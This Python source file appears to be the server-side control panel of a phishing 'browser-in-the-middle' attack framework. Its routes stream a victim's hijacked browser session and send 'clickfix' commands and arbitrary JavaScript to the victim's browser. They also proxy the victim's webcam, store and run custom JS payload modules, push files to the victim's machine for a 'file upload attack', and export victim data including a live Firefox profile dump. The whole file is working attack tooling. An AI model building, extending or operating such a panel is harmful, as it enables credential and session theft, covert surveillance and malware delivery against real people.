"""Interactive victim actions, modules, streaming, and export routes."""

from __future__ import annotations

from .campaign_common import (
    APIRouter,
    BackgroundTask,
    Campaign,
    CampaignModuleRequest,
    CommandRequest,
    Depends,
    ExportLimitError,
    File,
    FileResponse,
    HTTPException,
    JSONResponse,
    MAX_WEBCAM_PROXY_BODY_BYTES,
    MAX_WEBCAM_PROXY_RESPONSE_BYTES,
    Module,
    ModuleExecutionRequest,
    Path,
    Request,
    STORAGE_PATH,
    Session,
    UploadFile,
    UploadValidationError,
    User,
    Victim,
    WEBCAM_PROXY_METHODS,
    WEBCAM_SESSION_ID_PATTERN,
    build_public_access_url,
    campaign_internal_headers,
    configured_export_limit,
    configured_upload_limit,
    copy_tree_bounded,
    dump_firefox_data,
    get_db,
    httpx,
    json,
    logger,
    read_upload_limited,
    require_campaign_read_access,
    require_campaign_write_access,
    safe_campaign_directory_name,
    shutil,
    tempfile,
    uuid,
    validate_transfer_filename,
)

router = APIRouter()


@router.post("/{campaign_id}/victims/{victim_id}/stream-access")
async def create_victim_stream_access(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access),
):
    """Create a short-lived view-only capability for the admin dashboard."""
    campaign = db.query(Campaign).filter(
        Campaign.id == campaign_id,
        Campaign.deleted_at == None,
    ).first()
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id,
    ).first()
    if not campaign or not victim:
        raise HTTPException(404, "Campaign or victim not found")
    if campaign.protocol != "selkies":
        raise HTTPException(400, "Stream capabilities require Selkies")

    internal_api_url = (
        f"http://{campaign.container_name}:8080/api/sessions/"
        f"{victim_id}/stream-access"
    )
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(
                internal_api_url,
                headers=campaign_internal_headers(campaign_id),
                json={"role": "viewer", "ttl_seconds": 900},
            )
            response.raise_for_status()
    except httpx.HTTPStatusError as exc:
        if exc.response.status_code == 404:
            raise HTTPException(404, "Victim stream is not active") from exc
        logger.exception("Campaign gateway rejected stream capability")
        raise HTTPException(502, "Unable to authorize victim stream") from exc
    except httpx.HTTPError as exc:
        logger.exception("Campaign gateway stream capability request failed")
        raise HTTPException(502, "Campaign gateway is unavailable") from exc

    access_path = response.json()["access_path"]
    public_url = campaign.public_url or f"https://{campaign.host_ip}/"
    return JSONResponse(
        {
            "access_url": build_public_access_url(public_url, access_path),
            "expires_in": response.json()["expires_in"],
            "role": "viewer",
        },
        headers={"Cache-Control": "no-store"},
    )


@router.post("/{campaign_id}/victims/{victim_id}/clickfix")
async def send_clickfix_command(
    campaign_id: str,
    victim_id: str,
    request: CommandRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Send clickfix command to victim's browser"""

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # ✅ Send request to internal campaign API
    internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/clickfix"
    headers = campaign_internal_headers(campaign_id)

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                internal_api_url,
                headers=headers,
                json={"command": request.command},
                timeout=10.0
            )
            response.raise_for_status()
        except httpx.HTTPError as exc:
            logger.exception("Campaign clickfix service request failed")
            raise HTTPException(
                502,
                "Campaign service request failed",
            ) from exc

    logger.info(
        "Clickfix command sent to victim %s in campaign %s (by %s)",
        victim_id,
        campaign_id,
        current_user.username,
    )

    return {"success": True, "message": "Clickfix command sent"}


@router.post("/{campaign_id}/victims/{victim_id}/exec")
async def send_js_command(
    campaign_id: str,
    victim_id: str,
    request: CommandRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Send JavaScript command to victim's browser"""

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # ✅ Send request to internal campaign API
    internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/exec"
    headers = campaign_internal_headers(campaign_id)

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                internal_api_url,
                headers=headers,
                json={"command": request.command},
                timeout=10.0
            )
            response.raise_for_status()
        except httpx.HTTPError as exc:
            logger.exception("Campaign command service request failed")
            raise HTTPException(
                502,
                "Campaign service request failed",
            ) from exc

    logger.info(
        "JS command sent to victim %s in campaign %s (by %s)",
        victim_id,
        campaign_id,
        current_user.username,
    )

    return {"success": True, "message": "JS command sent"}


@router.api_route(
    "/{campaign_id}/victims/{victim_id}/webcam/{path:path}",
    methods=["GET", "POST"],
)
async def proxy_webcam(
    campaign_id: str,
    victim_id: str,
    path: str,
    request: Request,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access),
):
    """Proxy all webcam-related requests to the internal campaign API"""

    try:
        expected_method = WEBCAM_PROXY_METHODS.get(path)
        if expected_method is None:
            raise HTTPException(status_code=404, detail="Webcam operation not found")
        if request.method != expected_method:
            raise HTTPException(status_code=405, detail="Method not allowed")
        query_params = {}
        if request.url.query:
            if (
                path != "ice-candidates"
                or set(request.query_params) != {"session_id"}
            ):
                raise HTTPException(
                    status_code=400,
                    detail="Invalid webcam query parameters",
                )
            session_id = request.query_params["session_id"]
            if not WEBCAM_SESSION_ID_PATTERN.fullmatch(session_id):
                raise HTTPException(
                    status_code=400,
                    detail="Invalid webcam session",
                )
            query_params["session_id"] = session_id

        # Get campaign to find container name
        campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
        if not campaign:
            raise HTTPException(status_code=404, detail="Campaign not found")

        victim = db.query(Victim).filter(
            Victim.id == victim_id,
            Victim.campaign_id == campaign_id,
        ).first()
        if not victim:
            raise HTTPException(status_code=404, detail="Victim not found")

        # Build target URL
        target_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/webcam/{path}"

        logger.info(f"🔄 Proxying {request.method} to {target_url}")

        # Never forward the dashboard session cookie or CSRF header to a
        # campaign workload.
        headers = {}
        content_type = request.headers.get("content-type")
        if content_type:
            headers["Content-Type"] = content_type[:128]
        accept = request.headers.get("accept")
        if accept:
            headers["Accept"] = accept[:256]
        headers.update(campaign_internal_headers(campaign_id))

        # Read body if present
        body = None
        if request.method == "POST":
            content_length = request.headers.get("content-length")
            if content_length:
                try:
                    if int(content_length) > MAX_WEBCAM_PROXY_BODY_BYTES:
                        raise HTTPException(413, "Webcam request body is too large")
                except ValueError as exc:
                    raise HTTPException(400, "Invalid Content-Length") from exc
            body = await request.body()
            if len(body) > MAX_WEBCAM_PROXY_BODY_BYTES:
                raise HTTPException(413, "Webcam request body is too large")

        # Make request to internal service
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.request(
                method=request.method,
                url=target_url,
                headers=headers,
                content=body,
                params=query_params,
                follow_redirects=False,
            )

        if len(response.content) > MAX_WEBCAM_PROXY_RESPONSE_BYTES:
            raise HTTPException(502, "Campaign webcam response is too large")

        logger.info("Campaign webcam response: %s", response.status_code)

        if response.status_code >= 400:
            public_status = (
                response.status_code
                if 400 <= response.status_code < 500
                else 502
            )
            public_detail = {
                403: "Webcam access was denied",
                404: "Victim or webcam operation not found",
                408: "Webcam operation timed out",
                409: "Webcam operation is unavailable",
            }.get(
                public_status,
                (
                    "Webcam request was rejected"
                    if public_status < 500
                    else "Campaign webcam service failed"
                ),
            )
            return JSONResponse(
                content={"detail": public_detail},
                status_code=public_status,
                headers={"Cache-Control": "no-store"},
            )

        if "application/json" not in response.headers.get("content-type", ""):
            logger.error("Campaign webcam service returned a non-JSON response")
            raise HTTPException(
                status_code=502,
                detail="Campaign webcam service returned an invalid response",
            )
        try:
            payload = response.json()
        except ValueError as exc:
            logger.exception("Campaign webcam service returned invalid JSON")
            raise HTTPException(
                status_code=502,
                detail="Campaign webcam service returned an invalid response",
            ) from exc
        return JSONResponse(
            content=payload,
            status_code=response.status_code,
            headers={"Cache-Control": "no-store"},
        )

    except HTTPException:
        raise
    except httpx.TimeoutException:
        logger.error(f"⏱️ Timeout proxying to campaign {campaign_id}")
        raise HTTPException(status_code=504, detail="Campaign service timeout")
    except httpx.HTTPStatusError as exc:
        logger.exception("Campaign webcam service rejected the request")
        raise HTTPException(
            status_code=502,
            detail="Campaign webcam service rejected the request",
        ) from exc
    except Exception as exc:
        logger.exception("Campaign webcam proxy failed")
        raise HTTPException(
            status_code=500,
            detail="Campaign webcam proxy failed",
        ) from exc


@router.post("/{campaign_id}/modules")
def create_campaign_module(
    campaign_id: str,
    data: CampaignModuleRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Create new module and associate it with campaign"""

    # ✅ ACL - Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    # ✅ Extract data from body
    name = data.name or data.title
    description = data.description
    category = data.category
    icon = data.icon
    inputs = data.inputs
    payload = data.payload or data.payload_js
    link = data.link

    # ✅ Create Module record
    module_id = str(uuid.uuid4())[:8]

    new_module = Module(
        id=module_id,
        name=name,
        description=description,
        category=category,
        icon=icon,
        inputs=inputs,
        payload=payload,
        link=link
    )

    db.add(new_module)

    # ✅ Update campaign.module_ids
    module_ids = list(campaign.module_ids or [])
    if module_id not in module_ids:
        module_ids.append(module_id)
    campaign.module_ids = module_ids

    # ✅ Save module file to storage
    storage_path = (
        Path(STORAGE_PATH)
        / "campaigns"
        / safe_campaign_directory_name(campaign.name, campaign.id)
    )
    modules_dir = storage_path / "modules"
    modules_dir.mkdir(parents=True, exist_ok=True)

    file_path = modules_dir / f"{module_id}.json"

    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(new_module.to_dict(), f, indent=2)

    logger.info(
        "Module %s created for campaign %s (by %s)",
        module_id,
        campaign_id,
        current_user.username,
    )

    db.commit()
    db.refresh(new_module)

    return new_module.to_dict()


@router.get("/{campaign_id}/modules")
def list_modules(
    campaign_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """List all modules for a campaign (for module management)"""

    # ✅ ACL
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    modules = db.query(Module).filter(
        Module.id.in_(campaign.module_ids or [])
    ).all()

    logger.info(f"📋 Found {len(modules)} modules for campaign {campaign_id}")

    return [m.to_dict() for m in modules]


@router.post("/{campaign_id}/victims/{victim_id}/execute-module")
async def execute_module(
    campaign_id: str,
    victim_id: str,
    request: ModuleExecutionRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Execute module on victim's browser with parameters"""
    module_id = request.module_id
    params = request.params

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # ✅ Send request to internal campaign API
    internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/execute-module"
    headers = campaign_internal_headers(campaign_id)

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                internal_api_url,
                headers=headers,
                json={"module_id": module_id, "params": params},
                timeout=10.0
            )
            response.raise_for_status()
        except httpx.HTTPError as exc:
            logger.exception("Campaign module service request failed")
            raise HTTPException(
                502,
                "Campaign service request failed",
            ) from exc

    logger.info(
        "Module %s executed on victim %s in campaign %s (by %s)",
        module_id,
        victim_id,
        campaign_id,
        current_user.username,
    )

    return {"success": True, "message": "Module executed"}


@router.post("/{campaign_id}/victims/{victim_id}/send-file")
async def send_file_to_victim(
    campaign_id: str,
    victim_id: str,
    file: UploadFile = File(...),
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Send a file to the victim's machine (for file upload attack)"""

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    try:
        safe_filename = validate_transfer_filename(file.filename)
        file_content = await read_upload_limited(
            file,
            configured_upload_limit(),
        )
    except UploadValidationError as exc:
        status_code = 413 if "maximum size" in str(exc) else 400
        raise HTTPException(status_code=status_code, detail=str(exc)) from exc

    # ✅ Send request to internal campaign API
    internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/send-file"
    headers = campaign_internal_headers(campaign_id)

    # Prepare files dict for httpx
    files_to_send = {
        "file": (
            safe_filename,
            file_content,
            file.content_type or "application/octet-stream",
        )
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                internal_api_url,
                headers=headers,
                files=files_to_send
            )
            response.raise_for_status()
        except httpx.HTTPError as exc:
            logger.exception("Campaign file-delivery service request failed")
            raise HTTPException(
                502,
                "Campaign service request failed",
            ) from exc

    logger.info(
        "File %s sent to victim %s (by %s)",
        safe_filename,
        victim_id,
        current_user.username,
    )
    return {
        "success": True,
        "message": "File sent to victim",
        "filename": safe_filename,
    }


@router.get("/{campaign_id}/victims/{victim_id}/export")
async def export_victim(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Trigger a full session dump and export it as ZIP"""

    # 1. Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
    if not campaign:
        raise HTTPException(404, "Campaign not found")

    # 2. Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()
    if not victim:
        raise HTTPException(404, "Victim not found")

    export_limit = configured_export_limit()
    temp_dir_for_zip = Path(
        tempfile.mkdtemp(prefix=f"pbitm-export-{victim_id}-")
    )
    try:
        assembly_dir = temp_dir_for_zip / "data"
        assembly_dir.mkdir()
        total_bytes = 0

        # 4. Copy existing data from storage to the assembly directory.
        victim_storage_dir = (
            Path(STORAGE_PATH)
            / "campaigns"
            / safe_campaign_directory_name(campaign.name, campaign.id)
            / victim_id
        )
        if victim_storage_dir.exists():
            logger.info(f"📚 Copying existing data from {victim_storage_dir}...")
            total_bytes = copy_tree_bounded(
                victim_storage_dir,
                assembly_dir,
                max_bytes=export_limit,
                initial_bytes=total_bytes,
            )
        else:
            logger.warning(f"⚠️ No existing storage directory found for victim {victim_id}.")

        # 5. Replace any stored profile with a fresh, bounded live dump. Writing
        # directly to disk avoids keeping TAR, ZIP and Base64 copies in memory.
        firefox_zip_path = assembly_dir / "firefox_profile.zip"
        previous_firefox_size = (
            firefox_zip_path.stat().st_size
            if firefox_zip_path.is_file()
            else 0
        )
        try:
            logger.info("Starting live Firefox dump for victim %s", victim_id)
            available_bytes = export_limit - (total_bytes - previous_firefox_size)
            if available_bytes <= 0:
                raise ExportLimitError(
                    "Firefox profile exceeds the maximum export size"
                )
            firefox_zip_size = await dump_firefox_data(
                f"{campaign.container_name}-{victim_id}",
                firefox_zip_path,
                max_bytes=available_bytes,
            )
            if firefox_zip_size is not None:
                total_bytes = (
                    total_bytes
                    - previous_firefox_size
                    + firefox_zip_size
                )
                if total_bytes > export_limit:
                    raise ExportLimitError(
                        "Firefox profile exceeds the maximum export size"
                    )
                logger.info(
                    "Live Firefox dump added to export for victim %s",
                    victim_id,
                )
        except ExportLimitError:
            raise
        except Exception:
            logger.exception(
                "Failed to get live Firefox dump for victim %s; "
                "using stored artifacts only",
                victim_id,
            )

        # 6. Zip the assembled directory
        try:
            final_zip_base_name = temp_dir_for_zip / "victim-export"
            shutil.make_archive(str(final_zip_base_name), 'zip', root_dir=str(assembly_dir))
            final_zip_path = f"{final_zip_base_name}.zip"

            return FileResponse(
                path=final_zip_path,
                media_type="application/zip",
                filename=f"victim-{victim_id}-export.zip",
                background=BackgroundTask(
                    shutil.rmtree,
                    temp_dir_for_zip,
                    ignore_errors=True,
                ),
            )
        except Exception as e:
            logger.error(f"❌ Error creating final zip for victim {victim_id}: {e}")
            raise HTTPException(500, "Failed to create final export archive")
    except ExportLimitError as exc:
        logger.warning("Victim export rejected: %s", exc)
        raise HTTPException(413, str(exc)) from exc
    except HTTPException:
        raise
    finally:
        # FileResponse removes the directory after the response completes. On
        # errors there is no response background task, so clean it here.
        if not (temp_dir_for_zip / "victim-export.zip").exists():
            shutil.rmtree(temp_dir_for_zip, ignore_errors=True)
